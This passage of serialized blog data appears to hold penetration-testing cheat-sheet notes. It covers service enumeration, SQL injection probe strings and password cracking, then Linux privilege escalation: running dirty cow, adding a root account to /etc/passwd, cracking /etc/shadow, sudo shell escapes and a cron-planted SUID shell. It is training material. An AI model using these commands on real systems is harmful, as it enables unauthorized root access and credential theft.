SMB、DCERPC、NETBIOS\n***\n# 针对 SMTP 端口的尝试\n枚举用户，使用 VRFY 和 EXPN 命令\n***\n# 针对 SNMP 端口的测试\n默认共享名称如：public, private, cisco, manager\n使用工具：\n```\nOnesixtyone –c &lt;community list file&gt; -I &lt;ip-address&gt; Snmpwalk -c &lt;community string&gt; -v&lt;version&gt; &lt;ip address&gt;\n# 默认 MIB：\n1.3.6.1.2.1.25.1.6.0 System Processes 1.3.6.1.2.1.25.4.2.1.2 Running Programs 1.3.6.1.2.1.25.4.2.1.4 Processes Path 1.3.6.1.2.1.25.2.3.1.4 Storage Units 1.3.6.1.2.1.25.6.3.1.2 Software Name 1.3.6.1.4.1.77.1.2.25 User Accounts 1.3.6.1.2.1.6.13.1.3 TCP Local Ports\n# 比如枚举运行的进程\nnmpwalk -c public -v1 192.168.11.204 1.3.6.1.2.1.25.4.2.1.2\n```\n***\n# 针对 FTP 端口测试\n```\n● anonymous 是否可以登录\n● 如果可以登录是否可以使用 get 或 send 操作文件\n● 使用浏览器是否可以访问，ftp://&lt;ip-address&gt;\n```\n***\n# 密码破解\n在 linux 下可以使用 unshadow 命令合并 passwd 和 shadow 文件：\n```\nunshadow [passwd-file] [shadow-file] &gt; unshadowed.txt\n# 可以使用的 hash-identifier 识别 hash 类型，使用 hashcat 破解 hash\nhashcat -m 400 -a 0 &lt;hash file&gt; &lt;wordlist file&gt;\n# 对于其他服务，可以使用 Medusa 或 hydra\nHydra -L &lt;username file&gt; -P &lt;Password file&gt; -v &lt;ip-address&gt; ssh \nMedusa -h &lt;ip-address&gt; -U &lt;username file&gt; -P &lt;password file&gt; -M http -m DIR:/admin -T 30\n```\n***\n# 数据包抓取\n使用 wireshark / tcpdump 获取目标主机的流量\n```\ntcpdump -i tap0 host tcp port 80 and not arp and not icmp -vv\n```\n\n\n***\n# 参考资料\nNMAP Cheatsheet\n&lt;https://blogs.sans.org/pen-testing/files/2013/10/NmapCheatSheetv1.1.pdf&gt;\nExploit-DB\n&lt;https://www.exploit-db.com/&gt;\nKernel Exploits \n&lt;https://www.kernel-exploits.com/&gt;\nPrivilege Escalation Linux\n&lt;https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/&gt;\n&lt;Linux Pentest Commands\n&lt;http://www.networkpentest.net/p/linuxunix-command-list.html&gt;\nWindows Command Line Cheatsheet\n&lt;https://www.sans.org/security-resources/sec560/windows_command_line_sheet_v1.pdf&gt;\nPrivilege Escalation Windows:\n&lt;http://www.fuzzysecurity.com/tutorials/16.html&gt;\n&lt;http://toshellandback.com/2015/11/24/ms-priv-esc/&gt;\nWindows Priv Esc cheatsheet\n&lt;http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html&gt;\nPentest References:\n&lt;http://www.vulnerabilityassessment.co.uk/&gt;\n&lt;http://www.0daysecurity.com/penetration-testing/enumeration.html&gt;\nReverse Shell:\n&lt;https://www.asafety.fr/reverse-shell-one-liner-cheat-sheet/&gt;\n&lt;http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet&gt;\n&lt;http://bernardodamele.blogspot.com/2011/09/reverse-shells-one-liners.html&gt;\n&lt;http://www.lanmaster53.com/2011/05/7-linux-shells-using-built-in-tools/&gt;\nShell Escape:\n&lt;https://speakerdeck.com/knaps/escape-from-shellcatraz-breaking-out-of-restricted-unix-shells&gt;\nPentestmonkey Cheat Sheets (SQL Injection)\n&lt;http://pentestmonkey.net/category/cheat-sheet&gt;&quot;],&quot;filePath&quot;:[0,&quot;source/posts/Penetration/Common process for handling objectives.md&quot;],&quot;digest&quot;:[0,&quot;b8b8ecbbb1bd4d31&quot;],&quot;rendered&quot;:[0,{&quot;html&quot;:[0,&quot;&lt;h1 id=\&quot;nmap基本扫描\&quot;&gt;Nmap基本扫描&lt;a class=\&quot;anchor-link\&quot; href=\&quot;#nmap基本扫描\&quot;&gt;&lt;span class=\&quot;icon icon-link\&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/h1&gt;\n&lt;pre class=\&quot;astro-code astro-code-themes github-light github-dark\&quot; style=\&quot;background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;\&quot; tabindex=\&quot;0\&quot; data-language=\&quot;plaintext\&quot;&gt;&lt;code&gt;&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;nmap -Pn -p- -vv&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;nmap -Pn -p- -sU -vv&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;\n&lt;hr&gt;\n&lt;h1 id=\&quot;针对端口指纹和漏洞的扫描\&quot;&gt;针对端口指纹和漏洞的扫描&lt;a class=\&quot;anchor-link\&quot; href=\&quot;#针对端口指纹和漏洞的扫描\&quot;&gt;&lt;span class=\&quot;icon icon-link\&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/h1&gt;\n&lt;pre class=\&quot;astro-code astro-code-themes github-light github-dark\&quot; style=\&quot;background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;\&quot; tabindex=\&quot;0\&quot; data-language=\&quot;plaintext\&quot;&gt;&lt;code&gt;&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;Nmap -Pn -sV -O -pT:{TCP ports found in step 1},U:{UDP ports found in step 1} -script vuln &amp;#x3C;ip address&gt;&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;# 使用nc查看banner&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;nc -nv &amp;#x3C;ip-address&gt; &amp;#x3C;port&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;\n&lt;hr&gt;\n&lt;h1 id=\&quot;针对-web-端口的枚举\&quot;&gt;针对 web 端口的枚举&lt;a class=\&quot;anchor-link\&quot; href=\&quot;#针对-web-端口的枚举\&quot;&gt;&lt;span class=\&quot;icon icon-link\&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/h1&gt;\n&lt;pre class=\&quot;astro-code astro-code-themes github-light github-dark\&quot; style=\&quot;background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;\&quot; tabindex=\&quot;0\&quot; data-language=\&quot;plaintext\&quot;&gt;&lt;code&gt;&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;Nikto -port {web ports} -host &amp;#x3C;ip address&gt; -o &amp;#x3C;output file.txt&gt;&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;# 目录扫描&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;Dirb http{s}://&amp;#x3C;ip address&gt;:&amp;#x3C;port&gt; /usr/share/wordlist/dirb/{common/small/vulns}.txt&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;Gobuster -u http://&amp;#x3C;ip-address&gt; -w /usr/share/Seclists/Discovery/Web_Content/common.txt&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;#如果想测试文件包含漏洞，可以使用 fimap：&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;fimap -u &amp;#x3C;ip-address&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;\n&lt;hr&gt;\n&lt;h1 id=\&quot;针对已知的服务进行攻击尝试搜索漏洞信息\&quot;&gt;针对已知的服务进行攻击尝试，搜索漏洞信息&lt;a class=\&quot;anchor-link\&quot; href=\&quot;#针对已知的服务进行攻击尝试搜索漏洞信息\&quot;&gt;&lt;span class=\&quot;icon icon-link\&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/h1&gt;\n&lt;pre class=\&quot;astro-code astro-code-themes github-light github-dark\&quot; style=\&quot;background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;\&quot; tabindex=\&quot;0\&quot; data-language=\&quot;plaintext\&quot;&gt;&lt;code&gt;&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;Searchsploit &amp;#x3C;service name&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;\n&lt;p&gt;漏洞来源：\n&lt;a href=\&quot;https://www.securityfocus.com/vulnerabilities\&quot;&gt;https://www.securityfocus.com/vulnerabilities&lt;/a&gt;&lt;/p&gt;\n&lt;hr&gt;\n&lt;h1 id=\&quot;针对-web-页面的测试\&quot;&gt;针对 web 页面的测试&lt;a class=\&quot;anchor-link\&quot; href=\&quot;#针对-web-页面的测试\&quot;&gt;&lt;span class=\&quot;icon icon-link\&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/h1&gt;\n&lt;p&gt;检查页面信息，审查元素、查看 cookie、tamper 数据、可以使用 curl/wget\n在线搜索资源（比如 github），如果应用程序是开源的，根据网站枚举的信息猜测版本，然后找出可能存在的风险\n检查 HTTP 选项&lt;/p&gt;\n&lt;pre class=\&quot;astro-code astro-code-themes github-light github-dark\&quot; style=\&quot;background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;\&quot; tabindex=\&quot;0\&quot; data-language=\&quot;plaintext\&quot;&gt;&lt;code&gt;&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;测试输入表单参数（比如 1&#39; or 1=1 limit 1; # AND 1&#39; or 1=1--）&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;● NULL 或 null&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;● &#39;, \&quot;, ;, &amp;#x3C;!&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;  ○ 中断 SQL 字符串或查询，常用于 SQL、XPath、XML 注入&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;● -, =, +, \&quot;&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;  ○ 用于手工 SQL 注入测试&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;● &#39;, &amp;#x26;, ! , ¦ , &amp;#x3C; , &gt;&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;  ○ 用于找出命令执行漏洞&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;● ../&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;  ○ 目录穿越漏洞&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;\n&lt;hr&gt;\n&lt;h1 id=\&quot;针对-netbiossmbrpc-端口的测试\&quot;&gt;针对 NETBIOS、SMB、RPC 端口的测试&lt;a class=\&quot;anchor-link\&quot; href=\&quot;#针对-netbiossmbrpc-端口的测试\&quot;&gt;&lt;span class=\&quot;icon icon-link\&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/h1&gt;\n&lt;pre class=\&quot;astro-code astro-code-themes github-light github-dark\&quot; style=\&quot;background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;\&quot; tabindex=\&quot;0\&quot; data-language=\&quot;plaintext\&quot;&gt;&lt;code&gt;&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;enum4linux -a &amp;#x3C;ip address&gt; Rpcclient &amp;#x3C;ip address&gt; -U \&quot;\&quot; -N Rpcinfo -p &amp;#x3C;target ip&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;\n&lt;p&gt;关于 RPC 历史漏洞的合集：\n&lt;a href=\&quot;http://etutorials.org/Networking/network+security+assessment/Chapter+12.+Assessing+Unix+RPC+Services/12.2+RPC+Service+Vulnerabilities/\&quot;&gt;http://etutorials.org/Networking/network+security+assessment/Chapter+12.+Assessing+Unix+RPC+Services/12.2+RPC+Service+Vulnerabilities/&lt;/a&gt;\n以下是常用的远程测试命令&lt;/p&gt;\n&lt;pre class=\&quot;astro-code astro-code-themes github-light github-dark\&quot; style=\&quot;background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;\&quot; tabindex=\&quot;0\&quot; data-language=\&quot;plaintext\&quot;&gt;&lt;code&gt;&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;Showmount -e &amp;#x3C;ip address&gt;/&amp;#x3C;port&gt; &lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;Mount -t cifs //&amp;#x3C;server ip&gt;/&amp;#x3C;share&gt; &amp;#x3C;local dir&gt; -o username=”guest”,password=”” &lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;Rlogin &amp;#x3C;ip-address&gt; Smbclient -L &amp;#x3C;ip-address&gt; -U “” -N Nbtscan -r &amp;#x3C;ip address&gt; &lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;Net use &amp;#x3C;ip-address&gt;$Share “” /u:”” &lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;Net view &amp;#x3C;ip-address&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;\n&lt;p&gt;还可以使用 NMAP 的脚本测试 SMB、DCERPC、NETBIOS&lt;/p&gt;\n&lt;hr&gt;\n&lt;h1 id=\&quot;针对-smtp-端口的尝试\&quot;&gt;针对 SMTP 端口的尝试&lt;a class=\&quot;anchor-link\&quot; href=\&quot;#针对-smtp-端口的尝试\&quot;&gt;&lt;span class=\&quot;icon icon-link\&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/h1&gt;\n&lt;p&gt;枚举用户，使用 VRFY 和 EXPN 命令&lt;/p&gt;\n&lt;hr&gt;\n&lt;h1 id=\&quot;针对-snmp-端口的测试\&quot;&gt;针对 SNMP 端口的测试&lt;a class=\&quot;anchor-link\&quot; href=\&quot;#针对-snmp-端口的测试\&quot;&gt;&lt;span class=\&quot;icon icon-link\&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/h1&gt;\n&lt;p&gt;默认共享名称如：public, private, cisco, manager\n使用工具：&lt;/p&gt;\n&lt;pre class=\&quot;astro-code astro-code-themes github-light github-dark\&quot; style=\&quot;background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;\&quot; tabindex=\&quot;0\&quot; data-language=\&quot;plaintext\&quot;&gt;&lt;code&gt;&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;Onesixtyone –c &amp;#x3C;community list file&gt; -I &amp;#x3C;ip-address&gt; Snmpwalk -c &amp;#x3C;community string&gt; -v&amp;#x3C;version&gt; &amp;#x3C;ip address&gt;&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;# 默认 MIB：&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;1.3.6.1.2.1.25.1.6.0 System Processes 1.3.6.1.2.1.25.4.2.1.2 Running Programs 1.3.6.1.2.1.25.4.2.1.4 Processes Path 1.3.6.1.2.1.25.2.3.1.4 Storage Units 1.3.6.1.2.1.25.6.3.1.2 Software Name 1.3.6.1.4.1.77.1.2.25 User Accounts 1.3.6.1.2.1.6.13.1.3 TCP Local Ports&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;# 比如枚举运行的进程&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;nmpwalk -c public -v1 192.168.11.204 1.3.6.1.2.1.25.4.2.1.2&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;\n&lt;hr&gt;\n&lt;h1 id=\&quot;针对-ftp-端口测试\&quot;&gt;针对 FTP 端口测试&lt;a class=\&quot;anchor-link\&quot; href=\&quot;#针对-ftp-端口测试\&quot;&gt;&lt;span class=\&quot;icon icon-link\&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/h1&gt;\n&lt;pre class=\&quot;astro-code astro-code-themes github-light github-dark\&quot; style=\&quot;background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;\&quot; tabindex=\&quot;0\&quot; data-language=\&quot;plaintext\&quot;&gt;&lt;code&gt;&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;● anonymous 是否可以登录&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;● 如果可以登录是否可以使用 get 或 send 操作文件&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;● 使用浏览器是否可以访问，ftp://&amp;#x3C;ip-address&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;\n&lt;hr&gt;\n&lt;h1 id=\&quot;密码破解\&quot;&gt;密码破解&lt;a class=\&quot;anchor-link\&quot; href=\&quot;#密码破解\&quot;&gt;&lt;span class=\&quot;icon icon-link\&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/h1&gt;\n&lt;p&gt;在 linux 下可以使用 unshadow 命令合并 passwd 和 shadow 文件：&lt;/p&gt;\n&lt;pre class=\&quot;astro-code astro-code-themes github-light github-dark\&quot; style=\&quot;background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;\&quot; tabindex=\&quot;0\&quot; data-language=\&quot;plaintext\&quot;&gt;&lt;code&gt;&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;unshadow [passwd-file] [shadow-file] &gt; unshadowed.txt&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;# 可以使用的 hash-identifier 识别 hash 类型，使用 hashcat 破解 hash&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;hashcat -m 400 -a 0 &amp;#x3C;hash file&gt; &amp;#x3C;wordlist file&gt;&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;# 对于其他服务，可以使用 Medusa 或 hydra&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;Hydra -L &amp;#x3C;username file&gt; -P &amp;#x3C;Password file&gt; -v &amp;#x3C;ip-address&gt; ssh &lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;Medusa -h &amp;#x3C;ip-address&gt; -U &amp;#x3C;username file&gt; -P &amp;#x3C;password file&gt; -M http -m DIR:/admin -T 30&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;\n&lt;hr&gt;\n&lt;h1 id=\&quot;数据包抓取\&quot;&gt;数据包抓取&lt;a class=\&quot;anchor-link\&quot; href=\&quot;#数据包抓取\&quot;&gt;&lt;span class=\&quot;icon icon-link\&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/h1&gt;\n&lt;p&gt;使用 wireshark / tcpdump 获取目标主机的流量&lt;/p&gt;\n&lt;pre class=\&quot;astro-code astro-code-themes github-light github-dark\&quot; style=\&quot;background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;\&quot; tabindex=\&quot;0\&quot; data-language=\&quot;plaintext\&quot;&gt;&lt;code&gt;&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;tcpdump -i tap0 host tcp port 80 and not arp and not icmp -vv&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;\n&lt;hr&gt;\n&lt;h1 id=\&quot;参考资料\&quot;&gt;参考资料&lt;a class=\&quot;anchor-link\&quot; href=\&quot;#参考资料\&quot;&gt;&lt;span class=\&quot;icon icon-link\&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/h1&gt;\n&lt;p&gt;NMAP Cheatsheet\n&lt;a href=\&quot;https://blogs.sans.org/pen-testing/files/2013/10/NmapCheatSheetv1.1.pdf\&quot;&gt;https://blogs.sans.org/pen-testing/files/2013/10/NmapCheatSheetv1.1.pdf&lt;/a&gt;\nExploit-DB\n&lt;a href=\&quot;https://www.exploit-db.com/\&quot;&gt;https://www.exploit-db.com/&lt;/a&gt;\nKernel Exploits\n&lt;a href=\&quot;https://www.kernel-exploits.com/\&quot;&gt;https://www.kernel-exploits.com/&lt;/a&gt;\nPrivilege Escalation Linux\n&lt;a href=\&quot;https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/\&quot;&gt;https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/&lt;/a&gt;\n&amp;#x3C;Linux Pentest Commands\n&lt;a href=\&quot;http://www.networkpentest.net/p/linuxunix-command-list.html\&quot;&gt;http://www.networkpentest.net/p/linuxunix-command-list.html&lt;/a&gt;\nWindows Command Line Cheatsheet\n&lt;a href=\&quot;https://www.sans.org/security-resources/sec560/windows_command_line_sheet_v1.pdf\&quot;&gt;https://www.sans.org/security-resources/sec560/windows_command_line_sheet_v1.pdf&lt;/a&gt;\nPrivilege Escalation Windows:\n&lt;a href=\&quot;http://www.fuzzysecurity.com/tutorials/16.html\&quot;&gt;http://www.fuzzysecurity.com/tutorials/16.html&lt;/a&gt;\n&lt;a href=\&quot;http://toshellandback.com/2015/11/24/ms-priv-esc/\&quot;&gt;http://toshellandback.com/2015/11/24/ms-priv-esc/&lt;/a&gt;\nWindows Priv Esc cheatsheet\n&lt;a href=\&quot;http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html\&quot;&gt;http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html&lt;/a&gt;\nPentest References:\n&lt;a href=\&quot;http://www.vulnerabilityassessment.co.uk/\&quot;&gt;http://www.vulnerabilityassessment.co.uk/&lt;/a&gt;\n&lt;a href=\&quot;http://www.0daysecurity.com/penetration-testing/enumeration.html\&quot;&gt;http://www.0daysecurity.com/penetration-testing/enumeration.html&lt;/a&gt;\nReverse Shell:\n&lt;a href=\&quot;https://www.asafety.fr/reverse-shell-one-liner-cheat-sheet/\&quot;&gt;https://www.asafety.fr/reverse-shell-one-liner-cheat-sheet/&lt;/a&gt;\n&lt;a href=\&quot;http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet\&quot;&gt;http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet&lt;/a&gt;\n&lt;a href=\&quot;http://bernardodamele.blogspot.com/2011/09/reverse-shells-one-liners.html\&quot;&gt;http://bernardodamele.blogspot.com/2011/09/reverse-shells-one-liners.html&lt;/a&gt;\n&lt;a href=\&quot;http://www.lanmaster53.com/2011/05/7-linux-shells-using-built-in-tools/\&quot;&gt;http://www.lanmaster53.com/2011/05/7-linux-shells-using-built-in-tools/&lt;/a&gt;\nShell Escape:\n&lt;a href=\&quot;https://speakerdeck.com/knaps/escape-from-shellcatraz-breaking-out-of-restricted-unix-shells\&quot;&gt;https://speakerdeck.com/knaps/escape-from-shellcatraz-breaking-out-of-restricted-unix-shells&lt;/a&gt;\nPentestmonkey Cheat Sheets (SQL Injection)\n&lt;a href=\&quot;http://pentestmonkey.net/category/cheat-sheet\&quot;&gt;http://pentestmonkey.net/category/cheat-sheet&lt;/a&gt;&lt;/p&gt;&quot;],&quot;metadata&quot;:[0,{&quot;headings&quot;:[1,[[0,{&quot;depth&quot;:[0,1],&quot;slug&quot;:[0,&quot;nmap基本扫描&quot;],&quot;text&quot;:[0,&quot;Nmap基本扫描&quot;]}],[0,{&quot;depth&quot;:[0,1],&quot;slug&quot;:[0,&quot;针对端口指纹和漏洞的扫描&quot;],&quot;text&quot;:[0,&quot;针对端口指纹和漏洞的扫描&quot;]}],[0,{&quot;depth&quot;:[0,1],&quot;slug&quot;:[0,&quot;针对-web-端口的枚举&quot;],&quot;text&quot;:[0,&quot;针对 web 端口的枚举&quot;]}],[0,{&quot;depth&quot;:[0,1],&quot;slug&quot;:[0,&quot;针对已知的服务进行攻击尝试搜索漏洞信息&quot;],&quot;text&quot;:[0,&quot;针对已知的服务进行攻击尝试，搜索漏洞信息&quot;]}],[0,{&quot;depth&quot;:[0,1],&quot;slug&quot;:[0,&quot;针对-web-页面的测试&quot;],&quot;text&quot;:[0,&quot;针对 web 页面的测试&quot;]}],[0,{&quot;depth&quot;:[0,1],&quot;slug&quot;:[0,&quot;针对-netbiossmbrpc-端口的测试&quot;],&quot;text&quot;:[0,&quot;针对 NETBIOS、SMB、RPC 端口的测试&quot;]}],[0,{&quot;depth&quot;:[0,1],&quot;slug&quot;:[0,&quot;针对-smtp-端口的尝试&quot;],&quot;text&quot;:[0,&quot;针对 SMTP 端口的尝试&quot;]}],[0,{&quot;depth&quot;:[0,1],&quot;slug&quot;:[0,&quot;针对-snmp-端口的测试&quot;],&quot;text&quot;:[0,&quot;针对 SNMP 端口的测试&quot;]}],[0,{&quot;depth&quot;:[0,1],&quot;slug&quot;:[0,&quot;针对-ftp-端口测试&quot;],&quot;text&quot;:[0,&quot;针对 FTP 端口测试&quot;]}],[0,{&quot;depth&quot;:[0,1],&quot;slug&quot;:[0,&quot;密码破解&quot;],&quot;text&quot;:[0,&quot;密码破解&quot;]}],[0,{&quot;depth&quot;:[0,1],&quot;slug&quot;:[0,&quot;数据包抓取&quot;],&quot;text&quot;:[0,&quot;数据包抓取&quot;]}],[0,{&quot;depth&quot;:[0,1],&quot;slug&quot;:[0,&quot;参考资料&quot;],&quot;text&quot;:[0,&quot;参考资料&quot;]}]]],&quot;localImagePaths&quot;:[1,[]],&quot;remoteImagePaths&quot;:[1,[]],&quot;frontmatter&quot;:[0,{&quot;title&quot;:[0,&quot;Common process for handling objectives&quot;],&quot;date&quot;:[3,&quot;2023-02-05T10:36:58.000Z&quot;],&quot;tags&quot;:[1,[[0,&quot;渗透&quot;]]],&quot;categories&quot;:[0,&quot;Penetration&quot;]}],&quot;imagePaths&quot;:[1,[]]}]}],&quot;collection&quot;:[0,&quot;blog&quot;]}],&quot;href&quot;:[0,&quot;/blog/post/7&quot;]}],[0,{&quot;post&quot;:[0,{&quot;id&quot;:[0,&quot;penetration/mandatory-manual&quot;],&quot;data&quot;:[0,{&quot;title&quot;:[0,&quot;Mandatory manual&quot;],&quot;date&quot;:[3,&quot;2023-02-03T10:36:58.000Z&quot;],&quot;tags&quot;:[1,[[0,&quot;渗透&quot;]]],&quot;categories&quot;:[0,&quot;Penetration&quot;]}],&quot;body&quot;:[0,&quot;# Information gathering\n## Port scan\n```\nnetdiscover -r 192.168.124.0/24\nnmap -Pn -sV -O  -T4  --script vuln 192.168.124.44 -p-\n```\n\n\n## Web scan\n```\ndirb http://192.168.124.44:80/ /usr/share/wordlists/dirb/big.txt\nnikto  -port 80 -host 192.168.124.44 -o nikto-result.txt\n```\n***\n# Vulnerability analysis\nUse nc to view banner.\n```\nnc -nv 192.168.124.44 22\n```\n```\nsearchsploit &lt;service name&gt;\nsearchsploit -m 47080\n```\n\n\n***\n# Exploitation\n\n## smb\n```\nenum4linux 192.168.124.40\nsmbclient -L 192.168.124.40\n```\n\n\n***\n# Privilege escalation\n## Linux \n### Kernel stack overflow\n```\nuname -a\ncat /etc/*-release\nsearchsploit linux 3.10 CentOS Linux 7\n```\nuse tools\n```\n./linux-exploit-suggester-2.pl\n```\nTake the rights of dirty-cow as an example\n```\ngcc -pthread dirty.c -lcrypt -o dirty\nchmod +x dirty\n./dirty fly\n```\n### Plain password of root\nIf /etc/passwd can be write by common user.\n```\nopenssl passwd -1 -salt hacker 123456\n```\ngenerate `$1$hacker$4o50Z4aoUGaLMC0Rg4Io40`\n```\necho &#39;hacker:$1$hacker$4o50Z4aoUGaLMC0Rg4Io40:0:0:/root:/bin/bash&#39; &gt;&gt; /etc/passwd\n```\nThen login in user hacker\n\nIf /etc/shadow can be read by common user.\n```\nunshadow /etc/passwd /etc/shadow &gt; shadow.txt\nchmod 777 shadow.txt\njohn --format=crypt --wordlist=/usr/share/john/password.lst shadow.txt\n```\n### Password reuse\n### Sudo abuse\n`sudo -l`\n&gt;https://gtfobins.github.io/\n\nFor example:`su,    awk,    man `\n```\nsudo su\n```\n```\nsudo awk &#39;BEGIN {system(\&quot;/bin/sh\&quot;)}&#39;\n```\n```\nsudo man man\n!/bin/sh\n```\n```\nsudo vim -c &#39;:!/bin/sh&#39;\n```\n### &#39;su root&#39; prohibited\n```\npython -c &#39;import pty;pty.spawn(\&quot;/bin/sh\&quot;)\nsudo su\n```\n### Scheduled task\n```\nls -l /etc/cron*\ncat /etc/crontab\n```\nIf there is a scheduled task named 1.py\n```\nls -al /tmp/1.py    //查看是否有w权限\n```\nWrite the code into 1.py\n```\nimport os \nos.system(&#39;cp /bin/sh /tmp/sh&#39;) \nos.system(&#39;chmod u+s /tmp/sh&#39;)\n```\n`./tmp/sh`\n### SUID\nTake nmap as an example:\n```\nfind / -user root -perm -4000 -print 2&gt;/dev/null find / -perm -u=s -type f 2&gt;/dev/null\n/usr/local/bin/nmap 